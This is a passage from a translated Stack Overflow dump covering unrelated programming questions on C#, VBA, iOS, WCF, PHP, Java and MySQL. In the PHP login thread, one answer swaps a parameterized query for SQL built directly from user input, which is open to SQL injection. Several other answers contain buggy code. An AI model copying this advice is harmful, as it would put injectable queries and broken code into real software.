一旦在范围内，在您的特定情况下，您将需要一个隐式函数，它与您在问题中定义的函数相反：

```
implicit def charsetMap2Seqtup(input: CharsetMap): Seq[(String, Int)] = {
  Nil  // placeholder
} 
```

然后你应该可以打电话`somef2`给`p`

# c# - C# 中是否有某种“动态”枚举？

> ID：13756582
> 
> 赞同：0
> 
> 时间：2012-12-07T03:44:30.273
> 
> 标签：c#, enums

> **可能重复：**
> [如何在 .NET 类库中创建“抽象”枚举？](https://stackoverflow.com/questions/3030911/how-can-i-make-an-abstract-enum-in-a-net-class-library)

所以，这是我的项目。

我有一个网络框架，它有一个名为命令的枚举。这基本上告诉系统刚刚进来的数据包是否是 CONNECT、CHAT、JOIN 等。作为未来的步骤，我希望允许插件使用这个可以提供额外命令类型的“框架”。我知道您不能在后续插件中向现有枚举添加值，那么在上面做我想做的事情的正确方法是什么？一类？只是一个用于命令的整数字段，以及一系列 const int，如 CONNECT = 1、JOIN = 2 等？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:52:02.423

您可能应该将主要消息类型之一设置为`plugin`，这样您就可以将消息处理委托给插件本身，而不是尝试自己处理这些当前未知的数据包。此外，每个插件消息都应该包含一个标识符，该标识符指定哪个插件应该处理它。

通常，您要使插件系统尽可能模块化，这样您就不必担心它会如何干扰您的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:51:57.720

我认为最好的方法是创建一个带有常量的类

```
public class Commands
{
    public const int CONNECT = 1;
    public const int CHAT = 2;
    public const int JOIN = 3;
} 
```

当用户想要添加新的命令类型时，他需要覆盖这个类

```
public class PluginCommands: Commands
{
    public const int AddBuddy = 4;
    public const int Disconnect = 5;
} 
```

# facebook - Facebook：违规通知

> ID：13756585
> 
> 赞同：1
> 
> 时间：2012-12-07T03:45:04.953
> 
> 标签：facebook, authentication, permissions

我刚刚收到来自 Facebook 的“违规通知”电子邮件。

**您主要在 Facebook 之外托管的桌面网络游戏目前在进行身份验证和/或请求年龄、电子邮件和发布权限之外的其他权限时访问用户连接。（Facebook 平台政策 I.13a）。**

我试图弄清楚我应该访问哪些用户连接而不知所措。我的登录范围只有“email,user_birthday”。

根据通知，我相信这些都是允许的。有任何想法吗？

**编辑 ：**

只需重新阅读我收到的原始电子邮件，通知我我有政策问题，它清楚地指出“电子邮件”和“user_birthday”都是允许的。

**如果您的 Connect 应用程序正在访问用户连接或要求超出年龄、电子邮件和我们的发布权限的其他权限，请删除这些请求。12 月 5 日之后，您的 Connect 应用程序可能不再访问用户连接或请求除“user_birthday”、“email”或我们的发布权限（例如“publish_actions”或“publish_stream”）之外的其他权限。**

所以这显然是他们已经标记的其他东西。但我不知道是什么...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:03:56.297

如违规通知中所述，您无权访问好友列表：

> Facebook.com 以外的桌面网页游戏只能使用 Facebook 登录（身份验证，不包括朋友列表等用户连接）、社交插件和发布（例如，Feed Dialog、Stream Publish 或 Open Graph）。在进行身份验证时，这些游戏可能不会请求除年龄、电子邮件和我们的发布权限之外的其他权限。

来源：http: [//developers.facebook.com/policy/](http://developers.facebook.com/policy/)

# vba - Microsoft Access 2010 Relative Addressing Problems

> ID：13756590
> 
> 赞同：1
> 
> 时间：2012-12-07T03:46:01.550
> 
> 标签：vba, ms-access, relative-path, ms-access-2010

After learning that MS Access only allows absolute addressing for its linking of tables and that the only workaround for this problem was throught the use of VBA code I started coding up a way for it to do so. I found a relatively simple code and modified to suit my purpose which you can see below. However this method seems to have 2 main problems.

1 - I can't seem to link Excel Spreedsheets, as the first attempt lead to my whole module corrupting itself. Is there a way to link them as well?

2 - More importantly the size of the file increases each time it is open and the only modification to the database has been the addition of the code within the module. I've made it so it automatically executes upon opening of the file and after closing I've noticed it increases in size by several 100 kbs. Which is disturbing.

Also if there is a better method of doing this I'd be very interested in seeing how its done.

```
Public Sub RelinkTables(newPathName As String, backEnd As String, excel1 As String, excel2 As String)
Dim Dbs As Database
Dim Tdf As TableDef
Dim Tdfs As TableDefs
Set Dbs = CurrentDb
Set Tdfs = Dbs.TableDefs
'Loop through the tables collection
   For Each Tdf In Tdfs
    If Tdf.SourceTableName <> "" Then 'If the table source is other than a base table
        If Tdf.SourceTableName = "CClas$" Or Tdf.SourceTableName = "Sheet1$" Then

        Else
            Tdf.Connect = ";DATABASE=" & newPathName & backEnd 'Set the new source
            Tdf.RefreshLink 'Refresh the link
        End If
    End If
Next 'Goto next table

End Sub

Function ReLinker()
Dim currPath As String
Dim backEnd As String
Dim excel1 As String
Dim excel2 As String
currPath = CurrentProject.Path
Debug.Print currPath
backEnd = "\backEnd.accdb"
excel1 = "\excel1.xls"
excel2 = "\excel2.xls"

RelinkTables currPath, backEnd, excel1, excel2
End Function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:44:25.520

“*每次打开文件的大小都会增加*”

那讲得通。重新链接通常会增加 db 文件的大小。而且由于每次打开数据库时都会再次重新链接，因此您应该期望大小会增加。执行压缩以再次缩小 db 文件。

但是，我会检查现有链接，仅在需要更改时才执行重新链接。

此外，请考虑在继续重新链接之前验证您的链接文件目标是否存在。

```
If Len(Dir(currPath & backEnd)) = 0 _
        Or Len(Dir(currPath & excel1)) = 0 _
        Or Len(Dir(currPath & excel2)) = 0 Then
    MsgBox "Oops!"
End If 
```

对于 Excel 链接，请查看您是否可以在以下任何内容的基础上构建...

```
? CurrentDb.TableDefs("tblExcelData").Connect Like "Excel*"
True
? CurrentDb.TableDefs("tblExcelData").Connect
Excel 8.0;HDR=YES;IMEX=2;DATABASE=C:\share\Access\temp.xls
? Split(CurrentDb.TableDefs("tblExcelData").Connect, "DATABASE=")(1)
C:\share\Access\temp.xls 
```

# objective-c - 我将如何设置 UIPickerView？

> ID：13756591
> 
> 赞同：16
> 
> 时间：2012-12-07T03:46:02.897
> 
> 标签：objective-c, ios, xcode, uipickerview, choice

我正在设置 a`UIPickerView`以提供诸如**选项 a**、**选项 b**、**选项 c**等选项。我试图解释来自 Apple 的示例代码，但对于像我这样的初学者来说似乎很难理解。如果可能的话，我还希望选择器视图中的选项将我带到另一个页面。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-12-07T04:11:20.453

很明显，对于每个初学者来说，第一次理解这些东西是有些乏味的。

无论如何，你知道如何使用`UITableView`s 吗？你知道如何使用`UITableViewDelegate`和`UITableViewDataSource`吗？如果你的答案是肯定的，那么想象`UIPickerView`s 就像`UITableView`s（但记住它们不是`UITableViewController`s）。

假设，我有一个`UIPickerView`：

```
UIPickerView *objPickerView = [UIPickerView new];  // You need to set frame or other properties and add to your view...you can either use XIB code... 
```

1）首先，您需要通过 IB 或代码将`delegate`and分配`dataSource`给。`UIPickerView`这取决于您的实现（所以这一步看起来与 a 非常相似`UITableView`，不是吗？）

像这样：

```
objPickerView.delegate = self; // Also, can be done from IB, if you're using
objPickerView.dataSource = self;// Also, can be done from IB, if you're using 
```

2）接下来，您需要定义部分的数量，如下所示：

```
- (NSInteger)numberOfComponentsInPickerView:(UIPickerView *)thePickerView {
     return 1;  // Or return whatever as you intend
} 
```

2）然后你需要定义你需要的行数：

```
- (NSInteger)pickerView:(UIPickerView *)thePickerView 
numberOfRowsInComponent:(NSInteger)component {
     return 3;//Or, return as suitable for you...normally we use array for dynamic
} 
```

3）然后，为行定义标题（如果您有多个部分，则为每个部分定义标题）：

```
- (NSString *)pickerView:(UIPickerView *)thePickerView 
             titleForRow:(NSInteger)row forComponent:(NSInteger)component {
     return [NSString stringWithFormat:@"Choice-%d",row];//Or, your suitable title; like Choice-a, etc.
} 
```

4）接下来，您需要在有人单击元素时获取事件（当您要导航到其他控制器/屏幕时）：

```
- (void)pickerView:(UIPickerView *)thePickerView 
      didSelectRow:(NSInteger)row 
       inComponent:(NSInteger)component {

//Here, like the table view you can get the each section of each row if you've multiple sections
     NSLog(@"Selected Color: %@. Index of selected color: %i", 
     [arrayColors objectAtIndex:row], row);

     //Now, if you want to navigate then;
     // Say, OtherViewController is the controller, where you want to navigate:
     OtherViewController *objOtherViewController = [OtherViewController new];
     [self.navigationController pushViewController:objOtherViewController animated:YES];

} 
```

这就是您需要的所有实现。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-12-07T04:14:38.630

我将简要解释如何以编程方式实现这一目标

```
- (void)viewDidLoad {
    [super viewDidLoad];

    UIPickerView * picker = [UIPickerView new];
    picker.delegate = self;
    picker.dataSource = self;
    picker.showsSelectionIndicator = YES;
    [self.view addSubview:picker];
}

- (NSInteger)numberOfComponentsInPickerView:(UIPickerView *)pickerView {
    return 1;
}

- (NSInteger)pickerView:(UIPickerView *)pickerView numberOfRowsInComponent:(NSInteger)component {
    return 3;
}

- (NSString *)pickerView:(UIPickerView *)pickerView titleForRow:(NSInteger)row forComponent:(NSInteger)component {
    NSString * title = nil;
    switch(row) {
            case 0:
                title = @"a";
                break;
            case 1:
                title = @"b";
                break;
            case 2:
                title = @"c";
                break;
    }
    return title;
} 
```

基本上在`viewDidLoad`我们正在创建并向`UIPickerView`视图添加一个，告诉它我们的控制器同时用作`delegate`和`dataSource`（您也可以在 Interface Builder 中执行此操作）

然后我们正在实现两个数据源方法，以分别告诉 pickerView 有多少组件以及每个组件有多少行，`numberOfComponentsinPickerView:`以及`pickerView:numberOfRowsInComponent:`

最后，我们实现了`pickerView:titleForRow:forComponent:`返回每一行内容的委托方法。

如果您想在选择一行时自定义行为，您可以实现委托方法`pickerView:didSelectRow:inComponent:`——顾名思义——每次选择一行时都会调用该方法。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-07T04:00:16.597

UIPickerView 使用的部分类似于 UITableView 的使用。`DataSource`和`Delegate`协议。

这些`DataSource`方法用于告诉选择器您的选择器中有多少“列”和多少“行”。
其余的`Delegate`方法是行高、列宽、要显示的视图或标题，以及在选择器移动时回调。
[UIPickerView](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIPickerView_Class/Reference/UIPickerView.html)

# c++ - 如何使用 Ruby 的 Enumerable .map 方法在 C++ 中执行类似于 map 的操作

> ID：13756596
> 
> 赞同：0
> 
> 时间：2012-12-07T03:47:21.933
> 
> 标签：c++, ruby, enumerable

```
map(-30, -89.75, 89.75, 0, 360) 
```

我正在寻找这样的东西：

*   -30 是输入值。
*   -89.75 到 89.75 是可能输入值的范围
*   0 - 360 是要映射到的最终范围

有人告诉我有一种方法可以使用[http://ruby-doc.org/core-1.9.3/Enumerable.html#method-i-map](http://ruby-doc.org/core-1.9.3/Enumerable.html#method-i-map)

..然而它并不明显！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:08:43.123

如果我理解正确，我认为您只想将一个范围统一映射到另一个范围。所以，我们只需要计算它在输入范围内有多远，并返回输出范围的那一部分。

```
def map_range(input, in_low, in_high, out_low, out_high)
  # map onto [0,1] using input range
  frac = (input - in_low) / (in_high-in_low)
  # map onto output range
  frac * (out_high-out_low) + out_low
end 
```

另外，我应该注意到 map 在 ruby​​ 中的含义有点不同，更合适的描述可能是*transform*。

# .net - WCF Service works in debug but not as Windows Service

> ID：13756597
> 
> 赞同：1
> 
> 时间：2012-12-07T03:47:47.573
> 
> 标签：.net, wcf, wcf-binding, self-hosting

I have a WCF service that is a self hosted Windows Service. When debugging with the WCF Test Client the service works great. I use Javascript with simple ajax requests that return JSON. Although when I run the service as a Windows Service the request get a 400 error. I'm guessing this may have something to do with my config.

Any help is appreciated.

**WCF Test Client Config**

```
<system.serviceModel>
    <bindings>
        <wsHttpBinding>
            <binding name="MetadataExchangeHttpBinding_ISkyMobileService">
                <security mode="None" />
            </binding>
        </wsHttpBinding>
    </bindings>
    <client>
        <endpoint address="http://localhost:8523/HLT/Sky/SkyMobileService/mex"
            binding="wsHttpBinding" bindingConfiguration="MetadataExchangeHttpBinding_ISkyMobileService"
            contract="ISkyMobileService" name="MetadataExchangeHttpBinding_ISkyMobileService" />
    </client>
</system.serviceModel> 
```

**Windows Service App.Config**

```
 <system.serviceModel>
    <services>
      <service name="HLT.Sky.MobileDeviceServices.SkyMobileService" behaviorConfiguration="HeliosMobileServiceBehavior">
        <host>
          <baseAddresses>
            <add baseAddress="http://localhost:8523/HLT/Sky/SkyMobileService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="webHttpBinding" contract="HLT.Sky.MobileDeviceServices.ISkyMobileService" bindingNamespace="http://HLT.Sky.MobileDeviceServices" />
        <endpoint address="mex" binding="mexHttpBinding" contract="HLT.Sky.MobileDeviceServices.ISkyMobileService" bindingNamespace="http://HLT.Sky.MobileDeviceServices" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior name="SkyMobileServiceBehavior">
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="false"/>
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel> 
```

**Windows Service Implementation**

```
using System.ServiceProcess;
using System.ServiceModel;

namespace HLT.Sky.WindowsService1
{
    public partial class Service1 : ServiceBase
    {
        internal static ServiceHost myServiceHost = null;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            if (myServiceHost != null)
            {
                myServiceHost.Close();
            }
            myServiceHost = new ServiceHost(typeof(MobileDeviceServices.SkyMobileService));
            myServiceHost.Open();
        }

        protected override void OnStop()
        {
            if (myServiceHost != null)
            {
                myServiceHost.Close();
                myServiceHost = null;
            }
        }
    }
} 
```

**WCF Interface**

```
 #region GET
    // Return JSON Store for specified chartType
    [OperationContract]
    [WebGet(UriTemplate = "GetChartData?chartType={chartType}&serialNumber={serialNumber}&_dc={dc}&limit={limit}&callback={callback}", ResponseFormat = WebMessageFormat.Json)]
    string GetChartData(string dc, string limit, string callback, int chartType, string serialNumber);

    [OperationContract]
    [WebGet(ResponseFormat = WebMessageFormat.Json)]
    string GetHomePageData();
    #endregion

    #region POST
    [OperationContract]
    [WebInvoke(Method = "POST", UriTemplate = "VerifyPINData?pinData={pinData}", ResponseFormat = WebMessageFormat.Json)]
    bool VerifyPINData(string pinData);

    [OperationContract]
    [WebInvoke(Method = "POST", UriTemplate = "SubmitCNPData?cnpData={cnpData}&serialNumber={serialNumber}", ResponseFormat = WebMessageFormat.Json)]
    bool SubmitCNPData(int cnpData, string serialNumber);

    [OperationContract]
    [WebInvoke(Method = "POST", UriTemplate = "SendEmail?mailTo={mailTo}&subject={subject}&message={message}",ResponseFormat = WebMessageFormat.Json)]
    bool SendEmail(string mailTo, string subject, string message);

    #endregion 
```

**Program.cs**

```
static void Main()
    {
        ServiceBase[] ServicesToRun;
        ServicesToRun = new ServiceBase[] 
        { 
            new Service1() 
        };
        ServiceBase.Run(ServicesToRun);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T13:20:50.707

添加端点行为并删除“mex”端点最终解决了问题。请参阅下面的工作配置文件：

```
 <system.serviceModel>
    <client>
      <endpoint binding="webHttpBinding" bindingConfiguration="" contract="HLT.Sky.MobileDeviceServices.ISkyMobileService" />
    </client>
    <services>
      <service name="HLT.Sky.MobileDeviceServices.SkyMobileService" behaviorConfiguration="SkyMobileServiceBehavior">
        <host>
          <baseAddresses>
            <add baseAddress="http://localhost:8523/HLT/Sky/SkyMobileService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="webHttpBinding" contract="HLT.Sky.MobileDeviceServices.ISkyMobileService" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior name="SkyMobileServiceBehavior">
          <serviceMetadata httpGetEnabled="true"/>
          <serviceDebug includeExceptionDetailInFaults="true"/>
        </behavior>
      </serviceBehaviors>
            <endpointBehaviors>
        <behavior>
          <webHttp/>
        </behavior>
      </endpointBehaviors>
    </behaviors>
  </system.serviceModel> 
```

# php - Get last URI segment excluding query string

> ID：13756598
> 
> 赞同：1
> 
> 时间：2012-12-07T03:48:02.333
> 
> 标签：php

I have an URL say: `www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go`. I want to extract the string `register-car` from it using php code. Please help.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-07T03:54:20.720

尝试这个：

```
<?php 

 $url = "www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go";

 $register_car = basename(parse_url($url, PHP_URL_PATH));

 echo $register_car; // will echo "register-car"

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T03:56:05.887

```
$parts = parse_url("www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go", PHP_URL_PATH);
$pieces = explode($parts, "/");
$action = $pieces[count($pieces)-1]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T03:54:04.573

您正在寻找[parse_url](http://php.net/manual/en/function.parse-url.php)函数，后跟 basename 以返回最后一个 /item/。以下打印`register-car`。

```
 $parsed = parse_url("http://www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go", PHP_URL_HOST);
  echo basename($parsed['path']); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T03:54:22.640

您可以使用[parse_url](http://php.net/parse-url)和[basename](http://php.net/basename)的组合，甚至是[pathinfo](http://php.net/pathinfo)来帮助您解决这个问题。

在 PHP < 5.4.7

```
$url = "www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go";
$result = basename(parse_url("http://" . $url, PHP_URL_PATH));
echo $result; // register-car 
```

在 PHP >= 5.4.7

```
$url = "www.abc.com/blog/2012/12/register-car?w=Search&searchDmv=Go";
$result = basename(parse_url("//" . $url, PHP_URL_PATH));
echo $result; // register-car 
```

# java - How to set up HtmlUnit?

> ID：13756599
> 
> 赞同：0
> 
> 时间：2012-12-07T03:48:02.547
> 
> 标签：java, htmlunit

I am interested in writing a java application using HtmlUnit, but I do not understand how to set up the dependencies listed here: [http://htmlunit.sourceforge.net/dependencies.html](http://htmlunit.sourceforge.net/dependencies.html)

Is each entry on the page something you have to download?

Or I guess more specifically, could someone clarify for me what a dependency is and how you would add them to the IDE? I am currently using Eclipse.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T12:45:59.263

您应该只下载 HtmlUnit 的二进制发行版。它包含所有依赖项。然后只需将它们添加到项目的构建路径中。

# java - Counting the nodes in a binary search tree

> ID：13756605
> 
> 赞同：2
> 
> 时间：2012-12-07T03:49:03.403
> 
> 标签：java, recursion, binary-search-tree

I need to create a recursive method that takes as a parameter the root node of a binary search tree. This recursive method will then return the int value of the total number of nodes in the entire binary search tree.

This is what I have so far:

```
public class BinarySearchTree<E> extends AbstractSet<E>
{
protected Entry<E> root; 

//called by the main method
public int nodes()
{
    return nodes(root);
}       

//nodes() will count and return the nodes in the binary search tree

private int nodes(Entry<E> current)
{    
    if(current.element != null)
    { 
        if(current.left == null && current.right == null)
        {
            if(current.element == root.element)
            return 1;                   

            deleteEntry(current);              
            return 1 + nodes(current.parent);
        }
        else if(current.left != null && current.right == null)        
            return nodes(current.left);

        else if(current.left == null && current.right != null)
            return nodes(current.right);

        else if(current.left != null && current.right != null)
            return nodes(current.left) + nodes(current.right);      
    } else return 1;
    return 0;
} 
```

The main method calls nodes like so:

```
 System.out.println ("\nThis section finds the number of nodes "
             + "in the tree"); 

        System.out.println ("The BST has " + bst.nodes() + " nodes"); 
```

So I was running the search by traveling in order, once I'd get to a node with no children I would delete the current node and return to the parent node and continue. I ran a debug of the method I have above and the program crashes with a NullPointerException() when it finally counts and removes all the nodes on the left and right side of the root node and tries to return 1.

This is for my lab, the method MUST be recursive.

I'm very lost at this point, does anyone know what I'm doing wrong?

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-07T03:58:35.977

你让这种方式太复杂了。面向对象编程的基本思想是您信任对象来完成它们知道答案的工作。所以如果我是父母，我可以数数自己，我让我的孩子数数自己，等等。

```
private int nodes(Entry<E> current) {   
  // if it's null, it doesn't exist, return 0 
  if (current == null) return 0;
  // count myself + my left child + my right child
  return 1 + nodes(current.left) + nodes(current.right);
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-07T03:57:09.473

你有几个问题：

*   您在计算节点时正在删除节点？是不是`nodes()`要清理树？
*   您将`root==null`, `root!=null&left==null&&right==null`,`root!=null&left!=null&right==null`等视为单独的案例。他们不是。您有三种情况，它们并不完全排他性：
    *   如果当前节点不为空，则将计数加一。（应该总是这样。唯一可能为假的情况是当前节点 == `root`，我们可以事先检测并回避它。）
    *   如果当前节点有左孩子，则添加左孩子的计数。
    *   如果当前节点有右孩子，则添加右孩子的计数。
*   出于某种不敬虔的原因，*您*正在遍历树。看起来它与删除节点有关......？

但在我看来，最重要的是，你没有给`Entry`s 足够的自主权。:P

一个节点可以计算它自己的子节点。相信它。

```
class Entry<E> {
    ...

    int count() {
        int result = 1;
        if (left != null) result += left.count();
        if (right != null) result += right.count();
        return result;
    }
}

public int nodes() {
    return (root == null) ? 0 : root.count();
} 
```

如果你的老师不称职，并且*坚持*在节点之外使用一些节点计数功能，你可以做你想做的同样的事情：

```
private int nodes(Entry<E> current) {
     int result = 1;
     if (current.left) result += nodes(current.left);
     if (current.right) result += nodes(current.right);
     return result;
}

public int nodes() {
     return (root == null) ? 0 : nodes(root);
} 
```

但在我看来，那个老师应该被解雇。`Entry`类是*真正的*树； `BinarySearchTree`实际上只是一个引用根的容器。

另请注意，我不在乎`parent`s。如果我们从根开始计数，每个节点都计算它的子节点，计算它们的子节点等等……那么所有节点都将被计算在内。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-01-12T09:38:11.953

```
public int countNodes(Node root){
    // empty trees always have zero nodes
    if( root == null ){
        return 0;
    }

    // a node with no leafes has exactly one node
    // note from editor: this pice of code is a micro optimization
    // and not necessary for the function to work correctly!
    if( root.left == null && root.right == null ){
        return 1;
    }

    // all other nodes count the nodes from their left and right subtree
    // as well as themselves
    return countNodes( root.left ) + countNodes( root.right ) + 1;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T03:55:41.567

删除`current`in:后`deleteEntry(current);`，使用`current.parent`in`return 1 + nodes(current.parent);`

可能这就是抛出 NullPointerException 的原因。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-06-12T19:58:48.183

嘿，我为二叉树实现了非常干净的计数：

```
public class Binary<T> where T: IComparable<T>
{
    private Node _root;

    public int Count => _root.Count;

    public void Insert(T item)
    {
        Node newNode = new Node(item);
        if (_root == null)
            _root = newNode;
        else
        {
            Node prevNode = _root;
            Node treeNode = _root;
            while (treeNode != null)
            {
                prevNode = treeNode;
                treeNode = newNode.Item.CompareTo(treeNode.Item) < 1 ? treeNode.Left : treeNode.Right;
            }
            newNode.Parent = prevNode;
            if (newNode.Item.CompareTo(prevNode.Item) < 1)
                prevNode.Left = newNode;
            else
                prevNode.Right = newNode;
        }
    }

    public class Node
    {
        public T Item;

        public Node Parent;
        public Node Left;
        public Node Right;

        public Node(T item, Node parent = null, Node left = null, Node right = null)
        {
            Item = item;
            Parent = parent;
            Left = left;
            Right = right;
        }

        public int Count
        {
            get
            {
                int count = 1;
                count += Left?.Count ?? 0;
                count += Right?.Count ?? 0;
                return count;
            }
        }
    }
} 
```

也许这可以帮助您了解如何为带有计数的简单二叉树实现类。

此实现通过树中相应节点中的计数来访问计数。

如果您不熟悉 .NET 4.6 的标记，请告诉我

# mysql - 将 select 语句中的值分配给 MySQL 中的变量

> ID：13756607
> 
> 赞同：1
> 
> 时间：2012-12-07T03:49:10.987
> 
> 标签：mysql

一般来说，我对 SQL 相当陌生，对 MySQL 更是如此，我遇到了一个绊脚石。如果原始字段不为空，我正在尝试使用一个过程将一个字段的值复制到另一个字段，然后每当表更新或插入新行时，触发器都会调用此过程。这是我到目前为止所拥有的：

```
-- WORK_NOTES_PROCEDURE - This copies the contents of the estimate notes to the work   order notes if the original estimate had any notes with it.
DROP PROCEDURE IF EXISTS 'WORK_NOTES_PROCEDURE';
DELIMITER $$

CREATE PROCEDURE WORK_NOTES_PROCEDURE()
BEGIN
DECLARE var_temp VARCHAR(50);

SET var_temp := (SELECT ESTIMATE_NOTES FROM ESTIMATES WHERE ESTIMATES.ESTIMATE_NUMBER = WORK_ORDERS.ESTIMATE_NUMBER);

IF var_temp IS NOT NULL THEN

UPDATE WORK_ORDERS SET WORK_ORDER_NOTES = var_temp WHERE WORK_ORDERS.ESTIMATE NUMBER = ESTIMATES.ESTIMATE_NUMBER;

END IF; 
END$$

DELIMITER ; 
```

绝对任何帮助将不胜感激，我得到的错误是我为 var_temp 赋值的行的语法错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T03:51:59.907

尝试，

```
SET var_temp = (SELECT ESTIMATE_NOTES 
                FROM ESTIMATES INNER JOIN WORK_ORDERS
                     ON ESTIMATES.ESTIMATE_NUMBER = WORK_ORDERS.ESTIMATE_NUMBER
                LIMIT 1); 
```

# php - 只允许确认的用户登录不起作用

> ID：13756612
> 
> 赞同：0
> 
> 时间：2012-12-07T03:49:42.043
> 
> 标签：php

我使用下面的代码来确保只有确认的用户（确认为 1，否则为 0）可以登录，但无论如何此代码都会显示道歉消息。我怎样才能解决这个问题？谢谢！

```
// make sure the user is confirmed
    $confirmstatus = query("SELECT * FROM users WHERE username = ?", $_POST["username"]);
    if ($confirmstatus["confirmed"] == 0)
    {
        apologize("Please first confirm your account.");
    } 
```

这是查询功能

```
 /**
 * Executes SQL statement, possibly with parameters, returning
 * an array of all rows in result set or false on (non-fatal) error.
 */
function query(/* $sql [, ... ] */)
{
    // SQL statement
    $sql = func_get_arg(0);

    // parameters, if any
    $parameters = array_slice(func_get_args(), 1);

    // try to connect to database
    static $handle;
    if (!isset($handle))
    {
        try
        {
            // connect to database
            $handle = new PDO("mysql:dbname=" . DATABASE . ";host=" . SERVER, USERNAME, PASSWORD);

            // ensure that PDO::prepare returns false when passed invalid SQL
            $handle->setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 
        }
        catch (Exception $e)
        {
            // trigger (big, orange) error
            trigger_error($e->getMessage(), E_USER_ERROR);
            exit;
        }
    }

    // prepare SQL statement
    $statement = $handle->prepare($sql);
    if ($statement === false)
    {
        // trigger (big, orange) error
        trigger_error($handle->errorInfo()[2], E_USER_ERROR);
        exit;
    }

    // execute SQL statement
    $results = $statement->execute($parameters);

    // return result set's rows, if any
    if ($results !== false)
    {
        return $statement->fetchAll(PDO::FETCH_ASSOC);
    }
    else
    {
        return false;
    }
} 
```

这是道歉功能

```
 /**
 * Apologizes to user with message.
 */
function apologize($message)
{
    render("apology.php", ["message" => $message]);
    exit;
} 
```

和渲染功能。

```
 /**
 * Renders template, passing in values.
 */
function render($template, $values = [])
{
    // if template exists, render it
    if (file_exists("../templates/$template"))
    {
        // extract variables into local scope
        extract($values);

        // render header
        require("../templates/header.php");

        // render template
        require("../templates/$template");

        // render footer
        require("../templates/footer.php");
    }

    // else err
    else
    {
        trigger_error("Invalid template: $template", E_USER_ERROR);
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:07:44.327

尝试运行：

```
$confirmstatus = query("SELECT * FROM users WHERE username = ?", $_POST["username"]);
print_r($confirmstatus); 
```

仔细检查您的函数是否实际上返回了一个数组。

也试试这个作为你的查询：

```
 $Checkusername = $_POST['username'];
   $confirmstatus = query("SELECT * FROM users WHERE username = '$Checkusername'"); 
```

还。您的

```
function query(/* $sql [, ... ] */)
{ } 
```

传递给函数的变量已被注释掉。如果这与您的代码完全相同..那么我建议对以下内容进行修订：

```
function query ($sql)
{ .... } 
```

**编辑**

```
 if ($confirmstatus["0"]['confirmed'] == 0)
    {
        apologize("Please first confirm your account.");
    } 
```

我忽略了一些东西。似乎您正在返回一个多维数组您需要查看第一个数组（在本例中为 0），然后查找所需的字段。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-27T12:12:08.970

改用这个： $confirmstatus 返回一个包含其余部分的数组

$confirmstatus = query("SELECT * FROM users WHERE username = ?", $_POST["username"]); if ($confirmstatus[0]["confirmed"] == 0) { sorry("请先确认您的账号。"); }

# registry - Adding (Open with ???) in windows context menu

> ID：13756616
> 
> 赞同：1
> 
> 时间：2012-12-07T03:49:52.210
> 
> 标签：registry, contextmenu

I use my mouse to High-light text, very often, to search definitions of these words online. This is usually for my language lessons (Spanish and Italian)

I figure this would be a good way for me to learn how to add a new menu within the Context Menu on my windows 7 machine.

I'd like to High-light a word I read and don't understand "Comida", and right-click on the highlighted text - to see my custom menu "Translate with ....."

By the way, for those of you who are going to tell me to Copy/Paste the text into my browser, just remember I already do that. I'm simply trying to understand Context Menu Customization, and this seems like a fun way for me to optimize my learning.

I'm reading some decent tutorials on how to modify the registry to allow us to add our own Context Menu options (after right-clicking on something).

One of the most common examples I've seen in tutorials is how to add the CommandPrompt.

This CommandPrompt.reg example simply lets me right-click a folder and open the command prompt into the directory, saving me time.

```
Windows Registry Editor Version 5.00
[HKEY_CLASSES_ROOT\Directory\shell\CommandPrompt]
@=”Command Prompt:”
[HKEY_CLASSES_ROOT\Directory\shell\CommandPrompt\Command]
@=”cmd.exe /k cd %1″ 
```

funny thing, I didn't know windows 7 let's me do the same thing with the Shift key + right-clicking on the folder.

So, I've searched around for modifying the registry, with regards to right-clicking any high-lighted text, and I'm sure my search-terms are not quite getting me there. This is where I'm seeking a little guidance.

Hopefully my description is clear enough.

Since Text can be practically anywhere on my computer, or in any program (browsers, text docs, folder names, etc.....) I'm definitely in need of some guidance.

# c - readdir()->d_name 给出奇怪的值

> ID：13756617
> 
> 赞同：1
> 
> 时间：2012-12-07T03:49:54.293
> 
> 标签：c, readdir

我正在尝试使用以下代码获取父目录的名称：

```
dirp=opendir(cur_spot);
printf("parent name: %s\n", readdir(dirp)->d_name);
